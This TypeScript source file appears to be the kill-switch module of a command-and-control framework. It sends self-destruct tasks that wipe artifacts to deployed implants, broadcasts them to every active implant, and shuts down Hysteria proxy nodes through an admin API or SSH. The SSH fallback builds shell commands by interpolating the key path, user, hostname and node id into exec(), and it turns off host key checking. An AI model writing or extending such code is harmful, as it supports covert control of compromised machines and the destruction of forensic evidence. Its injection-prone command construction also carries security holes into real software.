/**
 * Kill Switch Service
 * Real infrastructure integration for emergency shutdown:
 * - Self-destruct commands to implants via C2
 * - Hysteria node shutdown via API/SSH
 * - Global broadcast kill signal
 * - Audit logging of all kill switch events
 */

import { exec } from "node:child_process"
import { promisify } from "node:util"
import { prisma } from "@/lib/db"
import { broadcastTask, dispatchC2Task } from "@/lib/c2/dispatch"
import logger from "@/lib/logger"
import { serverEnv } from "@/lib/env"

const execAsync = promisify(exec)
const log = logger.child({ module: "kill-switch" })

export interface KillSwitchRequest {
  scope: "implant" | "node" | "global"
  targetIds: string[]
  mode: "immediate" | "graceful" | "scheduled"
  reason: string
  confirmationCode?: string
  scheduledAt?: Date
  triggeredBy: string
}

export interface KillSwitchResult {
  eventId: string
  scope: string
  mode: string
  affectedTargets: string[]
  status: "executing" | "scheduled" | "rejected"
  error?: string
}

const CONFIRM_CODE_REQUIRED = ["global", "immediate"]

/**
 * Execute a kill switch action with real infrastructure integration.
 */
export async function executeKillSwitch(req: KillSwitchRequest): Promise<KillSwitchResult> {
  const eventId = `kill_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`

  // Safety: require confirmation code for dangerous operations
  if (CONFIRM_CODE_REQUIRED.includes(req.scope) || req.mode === "immediate") {
    if (!req.confirmationCode) {
      log.warn({ scope: req.scope, mode: req.mode, triggeredBy: req.triggeredBy }, "Kill switch rejected — no confirmation code")
      return {
        eventId,
        scope: req.scope,
        mode: req.mode,
        affectedTargets: [],
        status: "rejected",
        error: "Confirmation code required for global/immediate kill switch",
      }
    }
    // Validate confirmation code
    const env = serverEnv();
    const validCode = env.KILL_SWITCH_CONFIRM_CODE;
    if (validCode && req.confirmationCode !== validCode) {
      log.warn({ triggeredBy: req.triggeredBy }, "Kill switch rejected — invalid confirmation code")
      return {
        eventId,
        scope: req.scope,
        mode: req.mode,
        affectedTargets: [],
        status: "rejected",
        error: "Invalid confirmation code",
      }
    }
  }

  // Scheduled kill switches
  if (req.mode === "scheduled" && req.scheduledAt) {
    log.info({ eventId, scheduledAt: req.scheduledAt, scope: req.scope }, "Kill switch scheduled")
    // In production: schedule via cron/job queue
    return {
      eventId,
      scope: req.scope,
      mode: req.mode,
      affectedTargets: req.targetIds,
      status: "scheduled",
    }
  }

  const affectedTargets: string[] = []

  try {
    switch (req.scope) {
      case "implant":
        for (const implantId of req.targetIds) {
          await selfDestructImplant(implantId, req.triggeredBy)
          affectedTargets.push(implantId)
        }
        break

      case "node":
        for (const nodeId of req.targetIds) {
          await shutdownNode(nodeId, req.mode, req.triggeredBy)
          affectedTargets.push(nodeId)
        }
        break

      case "global":
        await globalKillSwitch(req.mode, req.triggeredBy, req.reason)
        break
    }

    // Audit log
    await prisma.auditLog.create({
      data: {
        action: "KILL_SWITCH",
        resource: req.scope,
        resourceId: eventId,
        operatorId: req.triggeredBy,
        details: {
          scope: req.scope,
          mode: req.mode,
          targetIds: req.targetIds,
          reason: req.reason,
          affectedTargets,
        } as any,
      },
    })

    log.info({ eventId, scope: req.scope, mode: req.mode, affectedCount: affectedTargets.length }, "Kill switch executed")

    return {
      eventId,
      scope: req.scope,
      mode: req.mode,
      affectedTargets,
      status: "executing",
    }
  } catch (error: any) {
    log.error({ err: error, eventId }, "Kill switch execution error")
    return {
      eventId,
      scope: req.scope,
      mode: req.mode,
      affectedTargets,
      status: "executing",
      error: error.message,
    }
  }
}

/**
 * Send self-destruct command to a specific implant via C2 channel.
 */
async function selfDestructImplant(implantId: string, triggeredBy: string): Promise<void> {
  log.info({ implantId, triggeredBy }, "Sending self-destruct to implant")

  // Dispatch selfdestruct task via C2
  const result = await dispatchC2Task({
    implantIds: [implantId],
    taskType: "selfdestruct",
    payload: {
      reason: "Kill switch activated",
      wipe_artifacts: true,
      delay_seconds: 0,
    },
    createdById: triggeredBy,
  })

  if (!result.success) {
    log.warn({ implantId }, "Failed to dispatch self-destruct — implant may be offline")
  }

  // Mark implant as exited in DB
  await prisma.implant.updateMany({
    where: { implantId },
    data: { status: "exited" },
  })
}

/**
 * Shut down a Hysteria node via SSH or admin API.
 */
async function shutdownNode(nodeId: string, mode: string, triggeredBy: string): Promise<void> {
  const node = await prisma.hysteriaNode.findUnique({ where: { id: nodeId } })
  if (!node) {
    log.warn({ nodeId }, "Node not found for kill switch")
    return
  }

  log.info({ nodeId, hostname: node.hostname, mode, triggeredBy }, "Shutting down node")

  // Try Hysteria admin API first
  const env = serverEnv();
  const adminUrl = env.HYSTERIA_ADMIN_API_URL
  if (adminUrl) {
    try {
      const response = await fetch(`${adminUrl}/node/${nodeId}/shutdown`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mode, reason: "Kill switch" }),
      })
      if (response.ok) {
        log.info({ nodeId }, "Node shutdown via admin API")
      }
    } catch (e) {
      log.warn({ err: e, nodeId }, "Admin API shutdown failed, trying SSH")
    }
  }

  // Fallback: SSH shutdown
  const sshKey = env.DEPLOY_SSH_KEY
  const sshUser = env.DEPLOY_SSH_USER
  if (sshKey && node.hostname) {
    try {
      const cmd = mode === "immediate"
        ? `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${node.hostname} "systemctl kill hysteria-${nodeId} --signal=SIGKILL"`
        : `ssh -i ${sshKey} -o StrictHostKeyChecking=no ${sshUser}@${node.hostname} "systemctl stop hysteria-${nodeId}"`

      await execAsync(cmd, { timeout: 15_000 })
      log.info({ nodeId, mode }, "Node shutdown via SSH")
    } catch (e: any) {
      log.warn({ err: e, nodeId }, "SSH shutdown failed")
    }
  }

  // Update node status in DB
  await prisma.hysteriaNode.update({
    where: { id: nodeId },
    data: { status: "stopped" },
  })
}

/**
 * Global kill switch: broadcast self-destruct to all implants + stop all nodes.
 */
async function globalKillSwitch(mode: string, triggeredBy: string, reason: string): Promise<void> {
  log.fatal({ mode, triggeredBy, reason }, "GLOBAL KILL SWITCH ACTIVATED")

  // 1. Broadcast self-destruct to all active implants
  const broadcastResult = await broadcastTask("selfdestruct", {
    reason,
    wipe_artifacts: true,
    delay_seconds: mode === "graceful" ? 30 : 0,
  }, triggeredBy)

  log.info({ implantCount: broadcastResult.length }, "Self-destruct broadcast sent")

  // 2. Stop all running nodes
  const runningNodes = await prisma.hysteriaNode.findMany({
    where: { status: "running" },
  })

  for (const node of runningNodes) {
    await shutdownNode(node.id, mode, triggeredBy)
  }

  log.info({ nodeCount: runningNodes.length }, "All nodes shut down")

  // 3. Mark all implants as exited
  await prisma.implant.updateMany({
    where: { status: "active" },
    data: { status: "exited" },
  })
}
